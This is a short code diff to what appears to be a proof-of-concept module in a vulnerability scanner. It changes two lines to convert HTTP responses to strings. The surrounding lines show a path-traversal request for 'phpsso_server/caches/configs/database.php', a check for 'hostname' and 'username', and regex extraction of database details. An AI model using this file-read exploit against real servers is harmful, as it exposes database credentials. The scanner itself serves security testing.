@@ -57,7 +57,7 @@ class Poc(ABPoc):
                                                                 "../../phpsso_server/caches/configs/database.php")
             request = urllib.request.Request(verify_url)
             response = urllib.request.urlopen(request)
-            content = response.read()
+            content = str(response.read())
 
             if ('hostname' in content) and ('username' in content):
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
@@ -84,7 +84,7 @@ class Poc(ABPoc):
             }
             request = urllib.request.Request(verify_url)
             response = urllib.request.urlopen(request)
-            content = response.read()
+            content = str(response.read())
             db_info = {}
             for regx in REGX_DICT:
                 match = re.search(REGX_DICT[regx], content)
